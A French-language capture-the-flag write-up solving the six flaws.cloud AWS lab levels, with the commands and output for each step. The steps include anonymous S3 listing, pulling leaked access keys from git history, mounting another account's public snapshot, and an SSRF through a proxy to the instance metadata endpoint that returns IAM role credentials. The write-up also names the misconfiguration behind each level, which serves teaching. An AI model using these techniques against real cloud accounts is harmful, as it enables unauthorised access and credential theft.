
# Flaws 

1. [Niveau-1](#Niveau-1)
2. [Niveau 2](#Niveau-2)
3. [Niveau 3](#Niveau-3)
4. [Niveau 4](#Niveau-4)
5. [Niveau 5](#Niveau-5)
6. [Niveau 6](#Niveau-6)

## Niveau 1 

http://flaws.cloud/

- `host flaws.cloud`

```
flaws.cloud has address 52.218.252.186
```

52.218.252.186 redirige vers https://aws.amazon.com/s3/

- `host 52.218.252.186`  

```
186.252.218.52.in-addr.arpa domain name pointer s3-website-us-west-2.amazonaws.com.
```

Region : us-west-2

Le site est aussi accessible via : http://flaws.cloud.s3-website-us-west-2.amazonaws.com/ car exposé sur internet

- Enumération des fichiers du bucket en **anonyme** : `aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2`
```
2017-03-14 04:00:38       2575 hint1.html
2017-03-03 05:05:17       1707 hint2.html
2017-03-03 05:05:11       1101 hint3.html
2018-07-10 18:47:16       3082 index.html
2018-07-10 18:47:16      15979 logo.png
2017-02-27 02:59:28         46 robots.txt
2017-02-27 02:59:30       1051 secret-dd02c7c.html
```

- **Flag** : La page `http://flaws.cloud/secret-dd02c7c.html` contient `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/`

Note : Le buket est aussi accessible par URL `http://flaws.cloud.s3.amazonaws.com/`

- **Cause** : Permission positionné sur `Everyone` correspondant à tout Internet

## Niveau 2

- Création d'un compte AWS tiers (gratuit) nécessaire
- Créer/récupérer le couple de clé : `https://console.aws.amazon.com/iam/home?region=us-east-2#/security_credentials`
- Configurer le compte dans `awscli`


- Enumeration des fichiers du bucket : `aws --profile freeuser s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`

```
2017-02-27 03:02:15      80751 everyone.png
2017-03-03 04:47:17       1433 hint1.html
2017-02-27 03:04:39       1035 hint2.html
2017-02-27 03:02:14       2786 index.html
2017-02-27 03:02:14         26 robots.txt
2017-02-27 03:02:15       1051 secret-e4443fc.html
``` 

- **Flag** : La page `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html` contient `http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/`

- **Cause** : Permission positionné sur `Any Authenticated AWS User` correspondant à toutes les personnes possédant un compte AWS

## Niveau 3

- Enumeration des fichiers du bucket : `aws --profile freeuser s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud`
```
                           PRE .git/
2017-02-27 01:14:33     123637 authenticated_users.png
2017-02-27 01:14:34       1552 hint1.html
2017-02-27 01:14:34       1426 hint2.html
2017-02-27 01:14:35       1247 hint3.html
2017-02-27 01:14:33       1035 hint4.html
2017-02-27 03:05:16       1703 index.html
2017-02-27 01:14:33         26 robots.txt
```

- Enumeration des fichiers du dossier `.git` du bucket : `aws --profile freeuser s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/`
```                           
                           PRE hooks/
                           PRE info/
                           PRE logs/
                           PRE objects/
                           PRE refs/
2017-09-17 17:12:24         52 COMMIT_EDITMSG
2017-09-17 17:12:24         23 HEAD
2017-09-17 17:12:24        130 config
2017-09-17 17:12:24         73 description
2017-09-17 17:12:24        600 index
```

- Téléchargement de l'ensemble du dossier `.git\` : `aws --profile freeuser s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .`

- Possibilité de faire un `git log`

```
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

- Depuis le **dossier parent** de `.git` se déplacer sur le commit : `git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61`
- L'arborescence change du fait du changement de commit : 

```
drwxr-xr-x  3 audit audit 4,0K sept. 20 16:54 .
drwxrwxrwt 22 root  root   12K sept. 20 16:49 ..
-rw-r--r--  1 audit audit   91 sept. 20 16:54 access_keys.txt
-rw-r--r--  1 audit audit 121K févr. 27  2017 authenticated_users.png
drwxr-xr-x  7 audit audit 4,0K sept. 20 16:54 .git
-rw-r--r--  1 audit audit 1,6K févr. 27  2017 hint1.html
-rw-r--r--  1 audit audit 1,4K févr. 27  2017 hint2.html
-rw-r--r--  1 audit audit 1,3K févr. 27  2017 hint3.html
-rw-r--r--  1 audit audit 1,1K févr. 27  2017 hint4.html
-rw-r--r--  1 audit audit 1,7K févr. 27  2017 index.html
-rw-r--r--  1 audit audit   26 févr. 27  2017 robots.txt
```

- On affiche le contenus : `cat access_keys.txt`

```
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```

- On ajoute l'utilisateur : `aws configure --profile flaws-lvl3`
```
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: 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
Default region name [None]: 
Default output format [None]: 
```

- Enumération **des buckets** : `aws --profile flaws-lvl3 s3 ls` ou `aws --profile flaws-lvl3 s3 ls s3://`
```
2017-02-12 22:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 18:34:53 config-bucket-975426262029
2017-02-12 21:03:24 flaws-logs
2017-02-05 04:40:07 flaws.cloud
2017-02-24 02:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 19:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 19:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 20:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 20:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 21:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

Il n'est pas possible d'autoriser le listing de seulement certains buckets. Donner la possibilité à un utilisateur de lister un bucket c'est lui donner la possibilité de lister tous les buckets. Il ne pourra pas forcément y accéder mais aura connaissance de leur existance

- **Flag** : `level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`

- **Cause** : Non révoquation de clés API ayant fuité dans le passé

## Niveau 4

- **Hint** : *It'll be useful to know that a **snapshot** was made of that EC2 shortly after nginx was setup on it*

- Tentative d'accés à un bucket existant : 

```
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

- Tentative d'accés à un bucket inexistant : 

```
An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
```

- Récupérer des informations sur le compte : `aws --profile flaws-lvl3 sts get-caller-identity`                                                       
```JSON
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

Numéro AWS : `975426262029` 
<br>
Nom d'utilisateur : `backup`

- Découvrir le snapshot : `aws --profile flaws-lvl3 ec2 describe-snapshots --owner-id 975426262029 --region us-west-2`
    - Préciser la region via `--region` ou via `aws configure --profile flaws-lvl3`
    - Sans owner `aws --profile flaws-lvl3 ec2 describe-snapshots --region us-west-2`, retourne un très grand nombre de résultat
``` JSON
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ]
        }
    ]
}
```

- Récupérer le snapshot via son ID : `aws --profile flaws-lvl3 ec2 describe-snapshots --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89`

- Monter le snapshot dans son compte AWS : `aws --profile <compte> ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-<id>`
- Créer un EC2 dans la console de son compte AWS : https://docs.aws.amazon.com/fr_fr/efs/latest/ug/gs-step-one-create-ec2-resources.html
    - Choisissez le snapshot en tant que stockage
- Connexion au snapshot :  `ssh -i <cle>.pem  <name>@ec2-<IP>.<region>.compute.amazonaws.com`
- Monter le volume en local : `sudo mount /dev/<volumne> /mnt`

- **Flag** : `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/`
- **Cause** : Mauvaise gestion des accés aux snapshot

## Niveau 5 

- **Hint** : *This EC2 has a simple HTTP only proxy on it*
    - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/` -> `http://flaws.cloud/`

- Accés aux metadata : `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/`
```
2007-01-19
2018-09-24
latest
```

- Récupérer le hostname : `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/hostname`
```
ip-172-31-41-84.us-west-2.compute.internal
```

- Récupérer le role associé : `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/`
```
flaws
```

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
```JSON
{
  "Code" : "Success",
  "LastUpdated" : "2019-09-22T17:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQG5VUD5R74",
  "SecretAccessKey" : "RTWj9hw1jsxkLipGj0YHjYKlDxa49pvMt7ETZDrg",
  "Token" : "AgoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCuQcS1yIdm19lp2p1Y1i+YeHP+DAMLw0mjB13fbLpI0QIgLRjocPpt6uAho6SnSX9Rdw5womC93x1AG+XUK03eYLQq4wMI8v//////////ARAAGgw5NzU0MjYyNjIwMjkiDF/q33zNh2nhVkIzgiq3A+hNQ3scuzOHVBioXFJRSPaAaewOQcMtrBwOwkC2KDL81Ls++VSTzfFahvuI58bvfAikvdqLZtkxhwY/fsDHEQq7iFBfPtIXzF5ogIS+NbpwBWiwNBzxWSJruOSWjy6iRRAj1LxMxZzwPt/OmRf77Y3X/49mLoxwz2hvzKUIBplsHjRhnMauNkmi44LOUpTXoF4Tmc8CWN8VtyO9wBtKyAvRLfOL7P58LzcT3ZalfXMUH2DJHfEOWrclpDFfe3A6Bvk1+2nkkw+NOxh4pCj/iN6KINYlTigX+lzRsyNv+9/1frQRMvJvYmCdNnRNAFd+2TUwNnk3O+ZAKPWq3ivR47J7a2h6wRQeRHQlBnsT2YbidrqdG7bm2/FSkgenpWyXUickNjWPUwBLRSOnY/8AzcuK+qe8W/mWBN1WEWZgQzEUolhyzqn9ET/OxZ5c8SXc0HjhrSr8x41Wok0idaQabP10MVUe+yPNRC2umX0uhkHztbx63q9/hwWsU6r1kG8M9HUQD/DXdnGyXi8KhYzUfN+dmecfn2c4BCgpmzzKFJsaf2H5KPAyeXOXt3D62roteKehiwxihEgwp9Ge7AU6tAG+rtRP8x7RLgvRy1uZRO5NAeW+eujyeq58tPzXyzvEh1qhWFmwwiqbiZuVY6mLDet+Bf0gt5DUyWs4dzt7Fi9RE04gDi1YgjWFhM0yHpgah5eN+t9UofoS78Gvb3uuo4h1XybIOF6kwmX6lFa+fIt34u2iTV79l8Z+JuAeSysrfmMNmqm8ECHoU+UCqOIEOCGgRJENO3OuCBTqTVaUDWgFgyuRxyGRLf8gfArbMyLmplAU2yQ=",
  "Expiration" : "2019-09-22T23:10:04Z"
}
```

- Configurer `~/.aws/credentials` :
```
[flaws-lvl5]
aws_access_key_id = XXXXX
aws_secret_access_key = XXXXX
aws_session_token = XXXXX
```

- Lister les buckets avec ce profil entraîne une erreur : `aws --profile flaws-lvl5 s3 ls s3://`
```
An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

- Lister les fichiers du bucket 6 :  `aws --profile flaws-lvl5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud`
```
                           PRE ddcc78ff/
2017-02-27 03:11:07        871 index.html
```

Découvre un nouveau dossier

- Liste les fichiers du dossier : `aws --profile flaws-lvl5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`
```
2017-03-03 05:36:23       2463 hint1.html
2017-03-03 05:36:23       2080 hint2.html
2017-03-03 05:36:25       2782 index.html
```

- **Flag** : `http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`
- **Cause** : Utilisation de IMDSv1 qui ne nécessite pas de header sécurisés contrairement à IMDSv2

## Niveau 6 

- **Hint** : *You're getting a user access key that has the SecurityAudit policy attached to it*
    - *Access key ID: AKIAJFQ6E7BY57Q3OBGA*
    - *Secret: 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*

- Récupérer de l'information sur le compte : `aws --profile flaws-lvl6 sts get-caller-identity`
```JSON
{
    "UserId": "AIDAIRMDOSCWGLCDWOG6A",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/Level6"
}
```

Utilisateur : `Level6`

- Pour récupérer l'utilisateur associer à un profil : `aws --profile flaws-lvl6 iam get-user`
<br>
<br>
- Afficher les politique en ligne intégrées à l'utilisateur : `aws --profile flaws-lvl6 iam list-user-policies --user-name Level6`
    - `list-user-policies` :*Lists the names of the **inline** policies embedded in the specified IAM user.*
    
```JSON
{
    "PolicyNames": []
}
```

- Afficher les politique gérées attachées à l'utilisateur : `aws --profile flaws-lvl6 iam list-attached-user-policies --user-name Level6`
    - `list-attached-user-policies` : *Lists all **managed** policies that are **attached** to the specified IAM user*

```JSON
{
    "AttachedPolicies": [
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        },
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        }
    ]
}
```

- Récupérer des informations sur la politique : `aws --profile flaws-lvl6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways`
    - Notamment la version qui sera utilisée par la suite
```JSON
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17Z",
        "UpdateDate": "2017-02-20T01:48:17Z"
    }
}
```

- Récupérer le contenus d'une politique : `aws --profile flaws-lvl6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4`
```JSON
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17Z"
    }
}
```

Cette politique accorde à l'utilisateur l'autorisation d'obtenir des informations sur l'ensemble des ressources, méthodes, modèles et étapes de l'API dans la région us-west-2

- Liste les fonctions lambda : `aws --region us-west-2 --profile flaws-lvl6 lambda list-functions`
```JSON
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "22f08307-9080-4403-bf4d-481ddc8dcb89"
        }
    ]
}
```

Nom de la fonction lambda : Level6

- Récupére la politique IAM associée la fonction lambda : `aws --region us-west-2 --profile flaws-lvl6 lambda get-policy --function-name Level6`
    - Le résultat peut être redirigé vers `jq '.Policy | fromjson'`pour plus de visibilité (**affiche uniquement le contenus de** `Policy`)
```JSON
{
   "Policy": {
        "Version": "2012-10-17",
        "Id": "default",
        "Statement": [
            {
            "Sid": "904610a93f593b76ad66ed6ed82c0a8b",
            "Effect": "Allow",
            "Principal": {
                "Service": "apigateway.amazonaws.com"
            },
            "Action": "lambda:InvokeFunction",
            "Resource": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Condition": {
                "ArnLike": {
                "AWS:SourceArn": "arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"
                }
            }
            }
        ]
    },
   "RevisionId":"22f08307-9080-4403-bf4d-481ddc8dcb89"
}
```

Identifiant REST de l'API : s33ppypa75

- Récupérer des informations au sujet de la ressource : `aws --profile flaws-lvl6 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"`
```JSON
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": 1488155168,
            "lastUpdatedDate": 1488155168
        }
    ]
}
```

L'etape : Prod

- On peut donc former le lien complet d'accès à l'API qui est de la forme : `https://<rest-api-id>.execute-api.<region>.amazonaws.com/<etape>/<nom-fonction>`
- https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
    - Retourn  : "Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
<br>
<br>
- **Flag** : `http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/`

- **Cause** : Capacité à lire ses politiques IAM & celle des autres
